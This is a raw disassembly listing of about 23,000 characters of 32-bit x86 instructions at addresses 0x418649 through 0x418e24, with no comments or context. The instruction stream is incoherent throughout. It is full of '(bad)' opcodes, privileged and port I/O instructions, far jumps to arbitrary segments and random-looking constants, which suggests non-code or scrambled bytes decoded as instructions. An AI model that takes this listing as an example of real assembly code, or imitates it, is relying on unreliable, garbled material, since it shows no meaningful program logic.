  418649:	add    DWORD PTR [ebp-0x3e46f526],eax
  41864f:	shr    bl,cl
  418651:	push   ss
  418652:	not    dh
  418654:	jnp    0x41861d
  418656:	dec    ebp
  418657:	cld    
  418658:	inc    ebx
  418659:	mov    ah,0x7a
  41865b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41865c:	int    0x5e
  41865e:	mul    bh
  418660:	addr16 mov esp,0xe45254a9
  418666:	inc    edx
  418667:	sub    eax,0x4ca2333
  41866c:	retf   0xe8e0
  41866f:	rol    ecx,0x10
  418672:	xchg   BYTE PTR [eax],al
  418674:	ror    BYTE PTR [esi-0x5b],1
  418677:	in     eax,dx
  418678:	or     BYTE PTR [ecx+0x26],ah
  41867b:	popf   
  41867c:	inc    esi
  41867d:	mov    eax,ds:0x883e013c
  418682:	jmp    0x8b275a87
  418687:	(bad)  
  418688:	or     ah,BYTE PTR [ecx-0x7cef1a9c]
  41868e:	std    
  41868f:	leave  
  418690:	push   edi
  418691:	in     eax,dx
  418692:	push   es
  418693:	mov    esp,0x42dc8feb
  418698:	rcr    BYTE PTR [esi+0x3659da4],0x21
  41869f:	fs dec ecx
  4186a1:	add    al,0xa7
  4186a3:	js     0x418646
  4186a5:	ror    BYTE PTR [ebp-0x356e5d6d],0x6
  4186ac:	test   BYTE PTR [edx-0x33e19f4b],0xb
  4186b3:	fild   QWORD PTR [ebx]
  4186b5:	aam    0x21
  4186b7:	stos   DWORD PTR es:[edi],eax
  4186b8:	xlat   BYTE PTR ds:[ebx]
  4186b9:	pop    ss
  4186ba:	mov    ebp,0xef8ab4e7
  4186bf:	mov    ds:0x71425ffc,eax
  4186c4:	push   ecx
  4186c5:	ds xchg ebp,eax
  4186c7:	ror    al,1
  4186c9:	cwde   
  4186ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186cb:	mov    esi,0x902f3fe3
  4186d0:	rol    ebp,0xf4
  4186d3:	loopne 0x4186cc
  4186d5:	ins    BYTE PTR es:[edi],dx
  4186d6:	mov    WORD PTR [ebx+0xe30ac2],ds
  4186dc:	sub    eax,0x4305a804
  4186e1:	jo     0x418708
  4186e3:	lock jecxz 0x418729
  4186e6:	cwde   
  4186e7:	dec    eax
  4186e8:	cmp    eax,0xd2bb3db8
  4186ed:	call   DWORD PTR [edi+edi*1+0x36b0c9ee]
  4186f4:	cmp    DWORD PTR [esi],esp
  4186f6:	sub    bx,WORD PTR [edi+0x3b913bd7]
  4186fd:	xor    DWORD PTR [esi],edi
  4186ff:	xor    cx,WORD PTR [ebx]
  418702:	fisttp WORD PTR [ecx-0x5db1eb6c]
  418708:	push   edx
  418709:	(bad)  
  41870b:	mov    dh,BYTE PTR [edx+0x15]
  41870e:	lds    ecx,FWORD PTR [ebx]
  418710:	jmp    0x418732
  418712:	sbb    DWORD PTR [edi+ebx*1],esi
  418715:	dec    ebx
  418716:	retf   0x28de
  418719:	mov    al,ds:0xee0813ca
  41871e:	and    eax,0xa55ba555
  418723:	push   es
  418724:	outs   dx,DWORD PTR ds:[esi]
  418725:	sbb    DWORD PTR [ebx],0xfffffff2
  418728:	jmp    0x41871a
  41872a:	xor    al,0x7f
  41872c:	and    al,BYTE PTR [ebx]
  41872e:	test   eax,0x2a6d4ae3
  418733:	nop
  418734:	pusha  
  418735:	jo     0x4186c2
  418737:	out    0x2c,eax
  418739:	inc    esp
  41873a:	jle    0x4187bb
  41873c:	cmp    BYTE PTR [edi-0x7b751c8b],ah
  418742:	add    dh,BYTE PTR [esi+0x61e3e135]
  418748:	sahf   
  418749:	fldcw  WORD PTR [edi-0x76d40681]
  41874f:	and    bl,0x31
  418752:	outs   dx,BYTE PTR ds:[esi]
  418753:	clc    
  418754:	emms   
  418756:	fst    QWORD PTR [ebp+0x32]
  418759:	repnz neg DWORD PTR [ecx]
  41875c:	jo     0x41877b
  41875e:	ss clc 
  418760:	mov    esi,0x9222586b
  418765:	fisub  WORD PTR [edi]
  418767:	inc    esp
  418768:	jg     0x418744
  41876a:	push   ss
  41876b:	mov    ebp,0xb9903714
  418770:	jns    0x418742
  418772:	invd   
  418774:	jns    0x4187e3
  418776:	loope  0x41872d
  418778:	push   ds
  418779:	test   al,0xb8
  41877b:	pusha  
  41877c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41877d:	dec    esp
  41877e:	cli    
  41877f:	mov    DWORD PTR [eax+0x30],ebp
  418782:	or     dl,bh
  418784:	cmp    BYTE PTR [edx-0x2e],bh
  418787:	mov    dh,0x7d
  418789:	sbb    edx,ebp
  41878b:	sub    al,0x19
  41878d:	jns    0x4187ff
  41878f:	popa   
  418790:	add    BYTE PTR [ebx-0xf1b4a46],cl
  418796:	push   cs
  418797:	jmp    0x41874f
  418799:	gs je  0x4187b9
  41879c:	dec    esi
  41879d:	lock push ss
  41879f:	jae    0x4187ba
  4187a1:	sti    
  4187a2:	sbb    eax,0x37cb8eb2
  4187a7:	pop    ebx
  4187a8:	fs xchg esp,esp
  4187ab:	jle    0x418740
  4187ad:	and    DWORD PTR [esi],edx
  4187af:	ins    DWORD PTR es:[edi],dx
  4187b0:	pusha  
  4187b1:	mov    eax,0x474ce267
  4187b6:	cmp    ecx,eax
  4187b8:	enter  0x11aa,0x62
  4187bc:	xor    eax,0x61115a03
  4187c1:	aaa    
  4187c2:	into   
  4187c3:	push   ebp
  4187c4:	ror    BYTE PTR [ebx-0x29c05ba7],cl
  4187ca:	loope  0x418754
  4187cc:	cli    
  4187cd:	sub    BYTE PTR [edi-0x5c2cd40e],ch
  4187d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d4:	mov    bl,0xfd
  4187d6:	push   ss
  4187d7:	pop    es
  4187d8:	cli    
  4187d9:	sub    ebp,DWORD PTR [esi+edi*1+0x2f]
  4187dd:	fs pop esp
  4187df:	and    eax,0x31b3c6eb
  4187e4:	int3   
  4187e5:	jae    0x418836
  4187e7:	and    eax,0x8f0b71a5
  4187ec:	es push esi
  4187ee:	out    dx,eax
  4187ef:	aad    0x7d
  4187f1:	mov    ecx,0x406973da
  4187f6:	add    edx,DWORD PTR [edi+0x29e57527]
  4187fc:	adc    ebx,0xffffffac
  4187ff:	dec    edi
  418800:	es adc ebp,ebp
  418803:	pop    ebx
  418804:	sub    ah,BYTE PTR [ebx+0x7f]
  418807:	add    DWORD PTR [ebp+ebx*2+0x11],ebp
  41880b:	sti    
  41880c:	push   ecx
  41880d:	jne    0x4187b0
  41880f:	lea    edi,[ecx+0x55]
  418812:	sbb    al,0xac
  418814:	stos   BYTE PTR es:[edi],al
  418815:	xchg   ecx,eax
  418816:	gs cli 
  418818:	push   0xffffffef
  41881a:	fiadd  DWORD PTR [ecx-0x56]
  41881d:	push   0x6b
  41881f:	outs   dx,BYTE PTR ds:[esi]
  418820:	popf   
  418821:	xor    ecx,DWORD PTR ds:0x5892441f
  418827:	stos   BYTE PTR es:[edi],al
  418828:	add    al,0xd8
  41882a:	imul   ecx,DWORD PTR [ebx],0x5f336f59
  418830:	add    ch,bh
  418832:	xchg   edx,eax
  418833:	fdivr  DWORD PTR [eax]
  418835:	mov    ebp,0x1ea363b2
  41883a:	(bad)  
  41883b:	jns    0x418842
  41883d:	pop    es
  41883e:	jl     0x4187d4
  418840:	dec    ebp
  418841:	cmc    
  418842:	lods   al,BYTE PTR ds:[esi]
  418843:	sbb    bl,ah
  418845:	cmp    al,BYTE PTR [esi]
  418847:	ins    BYTE PTR es:[edi],dx
  418848:	test   ebp,ebx
  41884a:	dec    cx
  41884c:	shl    BYTE PTR [edi-0x130b6d16],0x3e
  418853:	mov    gs,WORD PTR [ecx+0x4a]
  418856:	or     bl,cl
  418858:	jle    0x418859
  41885a:	xor    cl,BYTE PTR [ebx]
  41885c:	add    dl,cl
  41885e:	xchg   ecx,eax
  41885f:	dec    ebp
  418860:	rol    DWORD PTR [ecx+ebp*4-0xf0fa9c1],1
  418867:	dec    ecx
  418868:	mov    eax,0x1e5f5a55
  41886d:	push   eax
  41886e:	adc    eax,0xb7c59c
  418873:	add    eax,0xbe478934
  418878:	add    eax,0x60516e8a
  41887d:	and    bl,bh
  41887f:	push   cs
  418880:	arpl   WORD PTR [esi],bx
  418882:	add    al,0x3a
  418884:	inc    ebp
  418885:	mov    dl,dh
  418887:	cmp    eax,0x5fa9b84
  41888c:	jge    0x4188b7
  41888e:	inc    edi
  41888f:	xchg   BYTE PTR ds:0x9b9ae181,cl
  418895:	pop    ebp
  418896:	stc    
  418897:	outs   dx,BYTE PTR ds:[esi]
  418898:	mov    eax,0xcf10311b
  41889d:	repz cmp al,BYTE PTR ds:0x41a81382
  4188a4:	sbb    edx,DWORD PTR [ebp+0x690622f]
  4188aa:	addr16 xor eax,0x9c84a956
  4188b0:	mov    cl,0x6d
  4188b2:	shl    DWORD PTR [ebx-0x53],cl
  4188b5:	arpl   WORD PTR [edi],cx
  4188b7:	push   edi
  4188b8:	cmp    ah,bh
  4188ba:	into   
  4188bb:	fild   DWORD PTR [esp+ebx*4]
  4188be:	and    BYTE PTR [ebx+edx*4],ch
  4188c1:	mov    dh,0x45
  4188c3:	add    al,0xc4
  4188c5:	pop    esi
  4188c6:	sbb    dh,BYTE PTR [ebx-0x4]
  4188c9:	cli    
  4188ca:	fs pop ebp
  4188cc:	in     eax,dx
  4188cd:	mov    DWORD PTR [eax-0x56],esp
  4188d0:	lods   eax,DWORD PTR ds:[esi]
  4188d1:	and    DWORD PTR [eax+0x2c585296],eax
  4188d7:	add    eax,0x794f463e
  4188dc:	pop    ss
  4188dd:	cld    
  4188de:	sub    edi,DWORD PTR [edi+0x5c]
  4188e1:	push   edx
  4188e2:	cmp    DWORD PTR [ebx+0x68],esi
  4188e5:	sbb    bh,bl
  4188e7:	mov    al,BYTE PTR [ebx-0x22d3dc04]
  4188ed:	clc    
  4188ee:	inc    ecx
  4188ef:	jnp    0x41893b
  4188f1:	lock xchg ebx,eax
  4188f3:	or     al,0x10
  4188f5:	mov    dl,0x21
  4188f7:	mov    bh,0x71
  4188f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188fa:	jne    0x418892
  4188fc:	push   esp
  4188fd:	aaa    
  4188fe:	gs xor al,0xaf
  418901:	jnp    0x418932
  418903:	or     al,0xf5
  418905:	pushf  
  418906:	popa   
  418907:	push   0xffffffc4
  418909:	int    0x2a
  41890b:	mov    dh,0x86
  41890d:	scas   eax,DWORD PTR es:[edi]
  41890e:	into   
  41890f:	jmp    0x3bf1:0x26ea2c2f
  418916:	push   edi
  418917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418918:	out    dx,eax
  418919:	adc    eax,0x13212b02
  41891e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41891f:	out    dx,al
  418920:	fs sbb dl,al
  418923:	dec    edi
  418924:	jmp    0x52be8c19
  418929:	xchg   bl,al
  41892b:	scas   al,BYTE PTR es:[edi]
  41892c:	mov    WORD PTR [edx+0x25e580e1],?
  418932:	rol    BYTE PTR [ebx+0x6e],1
  418935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418936:	jo     0x4189a2
  418938:	mov    edi,0xabbc3184
  41893d:	push   cs
  41893e:	xor    cl,0xa0
  418941:	lock imul ebp,ebp,0xbb2b0be6
  418948:	dec    ecx
  418949:	sbb    bh,BYTE PTR [edi+0x76eaac49]
  41894f:	stos   BYTE PTR es:[edi],al
  418950:	jge    0x4188fb
  418952:	mov    esi,0xc37a80b9
  418957:	test   DWORD PTR [ebx+0x47],ecx
  41895a:	add    ebp,esp
  41895c:	push   esi
  41895d:	xor    ebp,DWORD PTR [esi-0x5c742c61]
  418963:	mov    ebx,0x3c573b1e
  418968:	into   
  418969:	mov    al,ds:0x8fc60358
  41896e:	push   es
  41896f:	sbb    al,0x45
  418971:	popa   
  418972:	dec    ebp
  418973:	ja     0x418945
  418975:	lods   eax,DWORD PTR ds:[esi]
  418976:	pop    DWORD PTR [ebx-0x6bf3898d]
  41897c:	data16 in al,0xd
  41897f:	mov    ah,0xcc
  418981:	icebp  
  418982:	pop    ebx
  418983:	shl    BYTE PTR [edi-0x51],0xa6
  418987:	or     BYTE PTR [ebp+0x2c80abd2],dl
  41898d:	retf   
  41898e:	iret   
  41898f:	sub    eax,0xf916e76b
  418994:	add    al,BYTE PTR fs:[ebp-0x7f]
  418998:	fimul  DWORD PTR [edi+ecx*8+0x1341c719]
  41899f:	in     eax,dx
  4189a0:	push   ecx
  4189a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189a2:	shl    DWORD PTR [esi+0x5841e2df],1
  4189a8:	jmp    0xcd54:0x832ecba1
  4189af:	push   eax
  4189b0:	sbb    bh,BYTE PTR [ecx+0x4a]
  4189b3:	mov    bl,0xe4
  4189b5:	retf   
  4189b6:	pop    esi
  4189b7:	mov    edx,DWORD PTR [ebp-0x16231d16]
  4189bd:	call   0x94262545
  4189c2:	fdiv   QWORD PTR [edx-0x34c61b70]
  4189c8:	adc    BYTE PTR [edi],ah
  4189ca:	cs pop edx
  4189cc:	lahf   
  4189cd:	sbb    al,0xe4
  4189cf:	sbb    eax,0x660a3e9b
  4189d4:	xor    ebp,DWORD PTR [ebx-0xf]
  4189d7:	inc    ecx
  4189d8:	cld    
  4189d9:	and    ah,BYTE PTR [esi]
  4189db:	dec    edi
  4189dc:	add    al,0x2e
  4189de:	mov    ?,WORD PTR [ebx-0x772043e4]
  4189e4:	add    eax,0x58d13ede
  4189e9:	pop    ds
  4189ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189eb:	or     eax,0x6213503c
  4189f0:	or     ebp,edi
  4189f2:	inc    ebx
  4189f3:	mov    dh,0x6c
  4189f5:	fst    QWORD PTR [ecx]
  4189f7:	popf   
  4189f8:	pushf  
  4189f9:	mov    edx,0x194659d7
  4189fe:	das    
  4189ff:	mov    esi,0x784cc582
  418a04:	jg     0x418a73
  418a06:	popf   
  418a07:	mov    al,0xe6
  418a09:	jmp    0x1a11558d
  418a0e:	xor    eax,0xd143fb4f
  418a13:	mov    al,0x85
  418a15:	or     esp,DWORD PTR [edi+eiz*4]
  418a18:	cmp    edi,0x4e603b8
  418a1e:	xchg   esp,eax
  418a1f:	push   esp
  418a20:	stos   BYTE PTR es:[edi],al
  418a21:	xchg   ebp,eax
  418a22:	add    al,0x93
  418a24:	push   ebx
  418a25:	pushf  
  418a26:	mov    bh,BYTE PTR [ecx+0x66b035f]
  418a2c:	jmp    0xfd72:0xc96f42f5
  418a33:	sbb    BYTE PTR [ebx+eax*4],0xc3
  418a37:	fisub  WORD PTR [ecx]
  418a39:	dec    esi
  418a3a:	inc    esp
  418a3b:	pop    ebp
  418a3c:	in     eax,dx
  418a3d:	xor    BYTE PTR [esi+0x57ca86c1],ah
  418a43:	xlat   BYTE PTR ds:[ebx]
  418a44:	pop    ecx
  418a45:	jno    0x418a60
  418a47:	stos   BYTE PTR es:[edi],al
  418a48:	std    
  418a49:	push   ebx
  418a4a:	mov    esi,0x217b8f25
  418a4f:	icebp  
  418a50:	jge    0x418a26
  418a52:	xchg   edx,eax
  418a53:	out    0xe4,eax
  418a55:	xchg   ebp,eax
  418a56:	dec    esi
  418a57:	ins    DWORD PTR es:[edi],dx
  418a58:	jno    0x4189ef
  418a5a:	aas    
  418a5b:	hlt    
  418a5c:	sub    eax,0x74a50e52
  418a61:	cmc    
  418a62:	mov    cl,BYTE PTR [edx-0x43]
  418a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a66:	fidivr DWORD PTR [esi-0x1a]
  418a69:	push   ebx
  418a6a:	(bad)  
  418a6b:	push   edi
  418a6c:	cld    
  418a6d:	pop    ebx
  418a6e:	outs   dx,DWORD PTR ds:[esi]
  418a6f:	out    dx,eax
  418a70:	and    BYTE PTR [esi+0x28],al
  418a73:	outs   dx,DWORD PTR ds:[esi]
  418a74:	pop    edi
  418a75:	sub    bh,ch
  418a77:	xchg   esp,eax
  418a78:	pop    ebx
  418a79:	mov    ebp,DWORD PTR [edx]
  418a7b:	cmp    eax,0x400b6175
  418a80:	xlat   BYTE PTR ds:[ebx]
  418a81:	leave  
  418a82:	aas    
  418a83:	xchg   si,ax
  418a85:	sbb    eax,0xd5c7972a
  418a8a:	jl     0x418aca
  418a8c:	ss leave 
  418a8e:	push   es
  418a8f:	nop
  418a90:	mov    ch,0x16
  418a92:	mov    DWORD PTR [eax+0x3e2133fd],eax
  418a98:	in     eax,dx
  418a99:	inc    ecx
  418a9a:	push   ecx
  418a9b:	dec    ecx
  418a9c:	(bad)  
  418a9d:	fstp   TBYTE PTR [ebp-0x28]
  418aa0:	inc    edi
  418aa1:	sbb    ah,BYTE PTR [esi]
  418aa3:	push   eax
  418aa4:	popf   
  418aa5:	sbb    cl,bl
  418aa7:	dec    edi
  418aa8:	sbb    eax,0xbe5b3803
  418aad:	gs cs dec edi
  418ab0:	in     al,dx
  418ab1:	sar    BYTE PTR [eax-0x7e],0xd6
  418ab5:	dec    ebx
  418ab6:	dec    edx
  418ab7:	nop
  418ab8:	popa   
  418ab9:	jl     0x418a7d
  418abb:	aaa    
  418abc:	mov    ebx,DWORD PTR [ecx-0x4524de2e]
  418ac2:	pusha  
  418ac3:	shl    DWORD PTR [ecx-0x5d9466e6],1
  418ac9:	nop
  418aca:	cmc    
  418acb:	sbb    eax,0x775b9d5f
  418ad0:	add    BYTE PTR [esi],ah
  418ad2:	(bad)  
  418ad4:	lahf   
  418ad5:	push   ecx
  418ad6:	dec    ecx
  418ad7:	jae    0x418ae6
  418ad9:	inc    eax
  418ada:	gs sti 
  418adc:	rol    DWORD PTR [esi+edx*2-0x1c],0x61
  418ae1:	in     al,dx
  418ae2:	inc    eax
  418ae3:	ffree  st(0)
  418ae5:	add    eax,0x97a2cdf2
  418aea:	push   cs
  418aeb:	rol    edi,0x61
  418aee:	and    eax,0xc0a6c867
  418af3:	sub    DWORD PTR [edx+0xde2efbe],ebx
  418af9:	push   0x6a0c1a9d
  418afe:	jo     0x418b6c
  418b00:	mov    dl,bh
  418b02:	scas   al,BYTE PTR es:[edi]
  418b03:	mov    eax,0x592eb4b
  418b08:	mov    al,0xd4
  418b0a:	jo     0x418b87
  418b0c:	xor    esp,DWORD PTR [ebp-0x6b21803c]
  418b12:	(bad)  
  418b13:	loopne 0x418ae0
  418b15:	arpl   WORD PTR [esi+0x49bc07eb],dx
  418b1b:	fist   WORD PTR [edx+esi*1-0x23]
  418b1f:	sbb    BYTE PTR [edi-0x451b3893],ah
  418b25:	jecxz  0x418b40
  418b27:	adc    BYTE PTR [ebp+0x3c],bh
  418b2a:	mov    ds:0x3e076257,eax
  418b2f:	push   edi
  418b30:	lock fcos 
  418b33:	sbb    eax,0x95240126
  418b38:	int    0x4a
  418b3a:	jbe    0x418b5e
  418b3c:	adc    edi,ebp
  418b3e:	inc    ecx
  418b3f:	adc    eax,0x453a31ea
  418b44:	fidiv  WORD PTR [ebx]
  418b46:	mov    BYTE PTR [edi+0x3a91e658],al
  418b4c:	aaa    
  418b4d:	or     eax,DWORD PTR [ebx-0x53]
  418b50:	into   
  418b51:	ret    0xb86
  418b54:	aaa    
  418b55:	popa   
  418b56:	mov    eax,ds:0x36640ead
  418b5b:	mov    al,ds:0x98d6e435
  418b60:	retf   0xf7c3
  418b63:	std    
  418b64:	push   edx
  418b65:	or     DWORD PTR [eax],ebp
  418b67:	cmp    DWORD PTR [ebx+0x3cf1d4bf],0x69
  418b6e:	arpl   WORD PTR [ebp-0x8dc4fc2],ax
  418b74:	and    bl,BYTE PTR [ecx+0x35]
  418b77:	sbb    al,0x4
  418b79:	push   0x3793558c
  418b7e:	icebp  
  418b7f:	jne    0x418b38
  418b81:	mov    ebp,0xb637a8f3
  418b86:	cmp    ch,BYTE PTR [eax+eiz*4]
  418b89:	mov    ah,0x90
  418b8b:	inc    ebp
  418b8c:	dec    ecx
  418b8d:	ficomp DWORD PTR ds:0x406c2ba7
  418b93:	mov    BYTE PTR [edi-0x19],bl
  418b96:	mov    ebp,0x7c54bb7a
  418b9b:	push   ss
  418b9c:	bndstx [ebp+0x13],(bad)
  418ba0:	pop    ss
  418ba1:	aas    
  418ba2:	daa    
  418ba3:	mov    dl,0x3
  418ba5:	hlt    
  418ba6:	pop    edi
  418ba7:	inc    ecx
  418ba8:	call   0x87f7:0xf0d1eb16
  418baf:	shl    ah,1
  418bb1:	rcl    DWORD PTR [ebp+0x11],1
  418bb4:	fwait
  418bb5:	lods   eax,DWORD PTR ds:[esi]
  418bb6:	(bad)  
  418bb7:	lods   eax,DWORD PTR ds:[esi]
  418bb8:	cmp    BYTE PTR gs:[ebx-0x38],cl
  418bbc:	test   edi,0x2b50cc83
  418bc2:	inc    edi
  418bc3:	cwde   
  418bc4:	or     edi,ecx
  418bc6:	dec    ecx
  418bc7:	js     0x418bd3
  418bc9:	mov    ch,BYTE PTR [eax+0x16]
  418bcc:	es (bad) 
  418bce:	int3   
  418bcf:	sub    ax,0xefea
  418bd3:	sbb    BYTE PTR [ecx-0x57],ch
  418bd6:	mov    cl,0x28
  418bd8:	stos   DWORD PTR es:[edi],eax
  418bd9:	dec    esi
  418bda:	mov    ah,0x99
  418bdc:	lods   al,BYTE PTR ds:[esi]
  418bdd:	loop   0x418c45
  418bdf:	stos   BYTE PTR es:[edi],al
  418be0:	cmp    al,0xb3
  418be2:	inc    esi
  418be3:	out    dx,eax
  418be4:	(bad)  
  418be5:	in     eax,dx
  418be6:	jge    0x418c13
  418be8:	stos   DWORD PTR es:[edi],eax
  418be9:	mov    ecx,0x98306bad
  418bee:	pop    edi
  418bef:	mov    es,WORD PTR [edi*8-0x6cb1fcf5]
  418bf6:	lea    edx,[ecx+ebx*8]
  418bf9:	mov    dl,BYTE PTR [ecx]
  418bfb:	inc    esp
  418bfc:	adc    al,0xc5
  418bfe:	(bad)  
  418bff:	aam    0xd6
  418c01:	cs sbb al,0x1c
  418c04:	rcl    DWORD PTR [ebp-0x77],0x17
  418c08:	ins    BYTE PTR es:[edi],dx
  418c09:	and    eax,DWORD PTR [ecx+0x62ac5ad6]
  418c0f:	lahf   
  418c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c11:	sti    
  418c12:	adc    esp,ebx
  418c14:	and    eax,DWORD PTR [edx]
  418c16:	mov    esp,0x16614832
  418c1b:	xlat   BYTE PTR ds:[ebx]
  418c1c:	daa    
  418c1d:	retf   
  418c1e:	loope  0x418c7f
  418c20:	or     dl,BYTE PTR ds:0x945ee233
  418c26:	fwait
  418c27:	js     0x418bf9
  418c29:	xchg   esp,eax
  418c2a:	ss ds stc 
  418c2d:	xchg   edx,eax
  418c2e:	mov    WORD PTR [eax],fs
  418c30:	mov    ebp,0x15e3a78
  418c35:	pop    ss
  418c36:	sub    dh,dh
  418c38:	sti    
  418c39:	jnp    0x418bd9
  418c3b:	imul   ecx,DWORD PTR [ebp-0x1020e364],0xdd7cf6c3
  418c45:	mov    ebx,0x1d514164
  418c4a:	fisubr WORD PTR [ebx]
  418c4d:	jne    0x418c99
  418c4f:	mov    WORD PTR [ebx+eax*8+0x68],?
  418c53:	pop    esp
  418c54:	sub    al,0xb4
  418c56:	pop    es
  418c57:	add    BYTE PTR [eax+0x2397124f],bh
  418c5d:	out    0x13,al
  418c5f:	inc    ebp
  418c60:	xor    al,0xf3
  418c62:	shr    dh,0xbb
  418c65:	adc    al,BYTE PTR [esi+ebp*1+0x1db6746f]
  418c6c:	rcr    BYTE PTR [edx+eax*8],cl
  418c6f:	nop
  418c70:	fld    DWORD PTR [bx+si+0x3e]
  418c74:	mov    al,0x8b
  418c76:	or     cl,dh
  418c78:	mov    ebp,0x647d4427
  418c7d:	mov    ch,0x77
  418c7f:	and    eax,0xf41d76a1
  418c84:	cld    
  418c85:	in     eax,dx
  418c86:	cli    
  418c87:	add    al,0xbf
  418c89:	jle    0x418c89
  418c8b:	sbb    al,0xf2
  418c8d:	adc    DWORD PTR [edi-0x71b1e02b],0xfffffffd
  418c94:	add    al,BYTE PTR [eax+edx*8+0x50]
  418c98:	xor    bl,dh
  418c9a:	addr16 stc 
  418c9c:	lahf   
  418c9d:	test   esi,edi
  418c9f:	jno    0x418c4a
  418ca1:	cld    
  418ca2:	outs   dx,BYTE PTR ds:[esi]
  418ca3:	hlt    
  418ca4:	sbb    bh,BYTE PTR [ecx+ebp*8]
  418ca7:	aaa    
  418ca8:	ficomp DWORD PTR ds:0xc9a69af9
  418cae:	adc    al,0x44
  418cb0:	ss lahf 
  418cb2:	in     al,dx
  418cb3:	ins    DWORD PTR es:[edi],dx
  418cb4:	(bad)  
  418cb6:	fs xchg edi,eax
  418cb8:	scas   eax,DWORD PTR es:[edi]
  418cb9:	daa    
  418cba:	(bad)  
  418cbb:	sbb    ah,dh
  418cbd:	aaa    
  418cbe:	(bad)  
  418cbf:	dec    ebx
  418cc0:	xor    al,ch
  418cc2:	add    eax,0x190bfc9b
  418cc7:	or     DWORD PTR [eax+0x41],ebx
  418cca:	aas    
  418ccb:	jecxz  0x418ca4
  418ccd:	push   ebp
  418ccf:	test   al,0x24
  418cd1:	jecxz  0x418d4e
  418cd3:	not    BYTE PTR [ecx-0x32]
  418cd6:	sbb    ecx,DWORD PTR [esi+esi*1]
  418cd9:	mov    ah,0xc7
  418cdb:	push   ecx
  418cdc:	push   edx
  418cdd:	shl    DWORD PTR [ebp-0x6c069b40],1
  418ce3:	mov    ch,0x30
  418ce5:	xchg   edx,eax
  418ce6:	inc    edi
  418ce7:	push   ecx
  418ce8:	pop    esi
  418ce9:	addr16 mov bh,0x9a
  418cec:	pop    esi
  418ced:	sti    
  418cee:	pop    ecx
  418cef:	jns    0x418ccb
  418cf1:	pop    ebx
  418cf2:	int    0x71
  418cf4:	jne    0x418c9f
  418cf6:	or     edi,DWORD PTR [ebx-0x742006cc]
  418cfc:	setge  BYTE PTR [ebp+0x6d4d9fa8]
  418d03:	lock repnz sbb eax,0x4dc282ab
  418d0a:	mov    al,ds:0xe83afdb6
  418d0f:	imul   esi,ebp,0xffffffe3
  418d12:	sbb    bl,bl
  418d14:	pop    es
  418d15:	push   0x5955b38
  418d1a:	int    0xdc
  418d1c:	mov    ebp,0x3fcc861
  418d21:	sbb    BYTE PTR [edi+eiz*4-0x56b793ca],bh
  418d28:	cmp    DWORD PTR [ebx-0x64],edx
  418d2b:	mov    ecx,0x53847ae3
  418d30:	(bad)  [esi]
  418d32:	jecxz  0x418da1
  418d34:	jns    0x418cc7
  418d36:	sub    DWORD PTR [ebx-0x65],0x5df873a4
  418d3d:	push   es
  418d3e:	add    al,0x75
  418d40:	mov    eax,ds:0x6e8645c3
  418d45:	adc    esi,DWORD PTR [esi-0x1537185]
  418d4b:	mov    ebp,0x8bd00176
  418d50:	iret   
  418d51:	(bad)  
  418d52:	sub    al,0x69
  418d54:	pop    ebp
  418d55:	sub    eax,0x8116053f
  418d5a:	add    ebp,DWORD PTR [ecx+0x72]
  418d5d:	prefetch BYTE PTR [esi+0x11]
  418d61:	fsubr  QWORD PTR [ebp-0x6293d4c0]
  418d67:	ret    
  418d68:	adc    DWORD PTR [ebx+0x636506a9],edx
  418d6e:	outs   dx,DWORD PTR ds:[esi]
  418d6f:	xchg   ecx,eax
  418d70:	aam    0x2b
  418d72:	and    DWORD PTR [edi-0x64],0x21
  418d76:	xchg   ebx,eax
  418d77:	sbb    cl,bl
  418d79:	jmp    0x8d4f:0x329f4640
  418d80:	int3   
  418d81:	mov    ch,0xbd
  418d83:	inc    ebp
  418d84:	push   eax
  418d85:	xor    eax,0x3a6c33f
  418d8a:	call   0xffa6bf60
  418d8f:	ins    DWORD PTR es:[edi],dx
  418d90:	inc    BYTE PTR [esi+0x6ffee274]
  418d96:	js     0x418d55
  418d98:	sbb    dh,BYTE PTR [ebp-0x31]
  418d9b:	call   0x6194cf95
  418da0:	dec    edx
  418da1:	mov    ch,0x1d
  418da3:	aad    0x2c
  418da5:	xor    bl,dl
  418da7:	inc    esi
  418da8:	bound  eax,QWORD PTR [edi+0x52]
  418dab:	(bad)  
  418dac:	popf   
  418dad:	inc    eax
  418dae:	jge    0x418e03
  418db0:	test   eax,0xba1cb6dc
  418db6:	jmp    0x418d5b
  418db8:	xor    dh,ah
  418dba:	stc    
  418dbb:	lods   al,BYTE PTR ds:[esi]
  418dbc:	(bad)  
  418dbe:	icebp  
  418dbf:	rcl    BYTE PTR [ebx+0x48],1
  418dc2:	and    ebp,DWORD PTR gs:[edx+ebp*4-0x18c7fc10]
  418dca:	sbb    eax,0x497468b8
  418dcf:	shl    BYTE PTR [edx],1
  418dd1:	fild   WORD PTR [eax-0x9]
  418dd4:	jmp    0x418e2a
  418dd6:	inc    edx
  418dd7:	jnp    0x418dad
  418dd9:	xchg   DWORD PTR [eax+0x3703d89a],esi
  418ddf:	pop    edi
  418de0:	cmp    esi,DWORD PTR [ecx-0x4b]
  418de3:	xor    eax,0x19227a15
  418de8:	inc    esp
  418de9:	jne    0x418de5
  418deb:	push   ds
  418dec:	mov    fs,WORD PTR [edx]
  418dee:	push   es
  418def:	mov    ds:0xda008c29,eax
  418df4:	xor    eax,0x840d80ae
  418df9:	lock add BYTE PTR [esp+ecx*8+0x155a10ae],0xf2
  418e02:	sub    DWORD PTR [edx-0x20],0xcb470092
  418e09:	loope  0x418e6d
  418e0b:	sub    al,0x5e
  418e0d:	sbb    al,0xcb
  418e0f:	jg     0x418dbf
  418e11:	xor    edi,eax
  418e13:	cmp    al,0x87
  418e15:	fisubr DWORD PTR [eax-0x7f191da8]
  418e1b:	jmp    0xc7b:0xab620327
  418e22:	sub    al,0xeb
  418e24:	shr    BYTE PTR [ecx+0x0],cl
